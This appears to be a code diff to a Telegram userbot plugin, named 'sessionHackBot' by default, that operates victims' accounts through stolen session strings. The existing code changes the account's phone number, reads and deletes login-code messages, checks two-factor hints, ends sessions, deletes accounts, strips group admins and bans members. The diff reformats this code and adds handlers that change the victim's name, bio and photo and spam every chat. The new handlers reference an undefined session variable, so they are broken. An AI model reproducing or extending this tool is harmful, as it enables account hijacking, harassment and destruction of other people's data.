@@ -1,6 +1,5 @@
-
 from JoKeRUB import bot, l313l
-#By Source joker @ucriss
+# By Source joker @ucriss
 from telethon import events, functions, types, Button
 from datetime import timedelta
 from JoKeRUB.utils import admin_cmd
@@ -13,9 +12,9 @@ from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
-import telethon;from telethon import functions
+import telethon
+from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
-
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
 bot = borg = tgbot
@@ -23,152 +22,171 @@ bot = borg = tgbot
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    bot = client = X
-    try: 
-      result = await bot(functions.account.ChangePhoneRequest(
-        phone_number=number,
-        phone_code_hash=code,
-        phone_code=otp
-      ))
-      return True
-    except:
-      return False
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        bot = client = X
+        try:
+            result = await bot(functions.account.ChangePhoneRequest(
+                phone_number=number,
+                phone_code_hash=code,
+                phone_code=otp
+            ))
+            return True
+        except:
+            return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    bot = client = X
-    result = await bot(functions.account.SendChangePhoneCodeRequest(
-        phone_number=number,
-        settings=types.CodeSettings(
-            allow_flashcall=True,
-            current_number=True,
-            allow_app_hash=True
-        )
-    ))
-    return str(result)
-
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        bot = client = X
+        result = await bot(functions.account.SendChangePhoneCodeRequest(
+            phone_number=number,
+            settings=types.CodeSettings(
+                allow_flashcall=True,
+                current_number=True,
+                allow_app_hash=True
+            )
+        ))
+        return str(result)
 
 async def userinfo(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    k = await X.get_me()
-    return str(k)
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        k = await X.get_me()
+        return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-        await X(rt())
-        return True
-    except Exception as rr:
-        return rr
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(rt())
+            return True
+        except Exception as rr:
+            return rr
 
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    await X(functions.account.DeleteAccountRequest("I am chutia"))
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    try:
-      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
-    except:
-      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
-    
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+        except:
+            await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
+
 async def user2fa(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    try:
-      result = await X(functions.account.GetPasswordRequest())
-      if result.has_password:
-        h = result.hint
-        if h == None:
-          h = "لا يوجد"
-        return False, h
-      else:
-        return True, "n"
-    except:
-        return False, "لا يوجد"
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            result = await X(functions.account.GetPasswordRequest())
+            if result.has_password:
+                h = result.hint
+                if h == None:
+                    h = "لا يوجد"
+                return False, h
+            else:
+                return True, "n"
+        except:
+            return False, "لا يوجد"
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
-      try:
-        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
-      except:
-        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
-      
-
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
+            try:
+                await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
+            except:
+                await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    await X(join(username))
-
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        await X(join(username))
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    await X(leave(username))
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    await X(dc(username))
-    
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        await X(dc(username))
 
 async def cu(strses):
-  try:
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        k = await X.get_me()
-        return [str(k.first_name), str(k.username or k.id)]
-  except Exception as e:
-    return False
+    try:
+        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+            k = await X.get_me()
+            return [str(k.first_name), str(k.username or k.id)]
+    except Exception as e:
+        return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    i = ""
-    
-    async for x in X.iter_messages(777000, limit=3):
-      i += f"\n{x.text}\n"
-    await X.delete_dialog(777000)
-    return str(i)
-
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        i = ""
+        async for x in X.iter_messages(777000, limit=3):
+            i += f"\n{x.text}\n"
+        await X.delete_dialog(777000)
+        return str(i)
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    k = await X.get_participants(grp)
-    for x in k:
-      try:
-        await X.edit_permissions(grp, x.id, view_messages=False)
-      except:
-        pass
-    
-
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        k = await X.get_participants(grp)
+        for x in k:
+            try:
+                await X.edit_permissions(grp, x.id, view_messages=False)
+            except:
+                pass
 
 async def userchannels(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    k = await X(pc())
-    i = ""
-    for x in k.chats:
-      try:
-        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
-      except:
-        pass
-    return str(i)
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        k = await X(pc())
+        i = ""
+        for x in k.chats:
+            try:
+                i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
+            except:
+                pass
+        return str(i)
 
+# دوال جديدة لتغيير الاسم، البايو، وصورة الحساب
+async def change_name(strses, first_name, last_name):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(functions.account.UpdateProfileRequest(
+                first_name=first_name,
+                last_name=last_name
+            ))
+            return True
+        except Exception as e:
+            return str(e)
 
+async def change_bio(strses, bio):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(functions.account.UpdateProfileRequest(
+                about=bio
+            ))
+            return True
+        except Exception as e:
+            return str(e)
 
-import logging
-logging.basicConfig(level=logging.WARNING)
+async def change_profile_picture(strses, file_path):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(functions.photos.UploadProfilePhotoRequest(
+                file=await X.upload_file(file_path)
+            ))
+            return True
+        except Exception as e:
+            return str(e)
 
-channel = "aqhvv"
+# دالة للقيام بعملية Gcast (إرسال رسالة إلى جميع الدردشات)
+async def gcast_all(strses, message):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            async for dialog in X.iter_dialogs():
+                if dialog.is_group or dialog.is_channel:
+                    await X.send_message(dialog.id, message)
+            return True
+        except Exception as e:
+            return str(e)
+
+# تحديث القائمة menu
 menu = '''
-
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
 
 "B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
@@ -195,35 +213,17 @@ menu = '''
 
 "M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
 
-'''
-mm = '''
-قم بلأنضمام الى الـقناة  @aqhvv
+"N" :~ [إرسال رسالة إلى جميع الدردشات (Gcast)]
+
+"O" :~ [تغيير اسم الحساب، البايو، أو صورة الحساب]
 '''
 
+# تحديث الكيبورد
 keyboard = [
-  [  
-    Button.inline("A", data="A"), 
-    Button.inline("B", data="B"),
-    Button.inline("C", data="C"),
-    Button.inline("D", data="D"),
-    Button.inline("E", data="E")
-    ],
-  [
-    Button.inline("F", data="F"), 
-    Button.inline("G", data="G"),
-    Button.inline("H", data="H"),
-    Button.inline("I", data="I"),
-    Button.inline("J", data="J"),
-    ],
-  [
-    Button.inline("K", data="K"), 
-    Button.inline("L", data="L"),
-    Button.inline("M", data="M"),
-    Button.inline("N", data="N"),
-    ],
-  [
-    Button.url("༺ sourCe kαᖇαᖇ ༻", "https://t.me/aqhvv")
-    ]
+    [Button.inline("A", data="A"), Button.inline("B", data="B"), Button.inline("C", data="C"), Button.inline("D", data="D"), Button.inline("E", data="E")],
+    [Button.inline("F", data="F"), Button.inline("G", data="G"), Button.inline("H", data="H"), Button.inline("I", data="I"), Button.inline("J", data="J")],
+    [Button.inline("K", data="K"), Button.inline("L", data="L"), Button.inline("M", data="M"), Button.inline("N", data="N"), Button.inline("O", data="O")],
+    [Button.url("༺ sourCe kαᖇαᖇ ༻", "https://t.me/aqhvv")]
 ]
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
     @tgbot.on(events.InlineQuery)
@@ -277,6 +277,7 @@ async def start(event):
             Button.inline("L", data="L"),
             Button.inline("M", data="M"),
             Button.inline("N", data="N"),
+            Button.inline("O", data="O")
             ],
           [
             Button.url("المـطور", "https://t.me/Lx5x5")
@@ -733,3 +734,65 @@ async def users(event):
       await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
       i = await gcastc(strses.text, msg.text)
       await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
+    
+# معالج الحدث للزر O
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
+async def change_profile_options(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if not op:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+
+        # عرض خيارات لتغيير الاسم، البايو، أو الصورة
+        options_keyboard = [
+            [Button.inline("1 - تغيير اسم الحساب", data="change_name")],
+            [Button.inline("2 - تغيير بايو الحساب", data="change_bio")],
+            [Button.inline("3 - تغيير صورة الحساب", data="change_pic")],
+            [Button.inline("رجوع", data="back")]
+        ]
+        await event.edit("اختر ما تريد تغييره:", buttons=options_keyboard)
+
+# معالج الحدث لتغيير الاسم
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"change_name")))
+async def change_name_handler(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("ارسل الاسم الأول:")
+        first_name = (await x.get_response()).text
+        await x.send_message("ارسل الاسم الأخير:")
+        last_name = (await x.get_response()).text
+        result = await change_name(strses.text, first_name, last_name)
+        if result is True:
+            await event.respond("تم تغيير الاسم بنجاح ✅", buttons=keyboard)
+        else:
+            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)
+
+# معالج الحدث لتغيير البايو
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"change_bio")))
+async def change_bio_handler(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("ارسل البايو الجديد:")
+        bio = (await x.get_response()).text
+        result = await change_bio(strses.text, bio)
+        if result is True:
+            await event.respond("تم تغيير البايو بنجاح ✅", buttons=keyboard)
+        else:
+            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)
+
+# معالج الحدث لتغيير صورة الحساب
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"change_pic")))
+async def change_profile_picture_handler(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("ارسل مسار الصورة (file path):")
+        file_path = (await x.get_response()).text
+        result = await change_profile_picture(strses.text, file_path)
+        if result is True:
+            await event.respond("تم تغيير صورة الحساب بنجاح ✅", buttons=keyboard)
+        else:
+            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)
+
+# معالج الحدث للرجوع إلى القائمة الرئيسية
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"back")))
+async def back_to_main_menu(event):
+    await event.edit("اختر ما تريد فعله مع الجلسة:", buttons=keyboard)
